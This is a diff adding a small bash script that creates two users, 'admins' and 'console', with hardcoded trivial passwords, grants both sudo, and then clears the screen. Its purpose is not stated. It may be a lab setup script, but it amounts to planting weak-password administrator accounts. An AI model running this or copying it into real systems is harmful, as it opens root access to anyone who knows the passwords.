@@ -1,0 +1,13 @@
+#!/bin/bash
+
+
+useradd  -m   -s /bin/bash admins
+printf "stems\nstems" | sudo passwd admins
+
+useradd  -m   -s /bin/bash console
+printf "cons\ncons" | sudo passwd console
+
+usermod -aG sudo admins
+usermod -aG sudo console
+
+clear
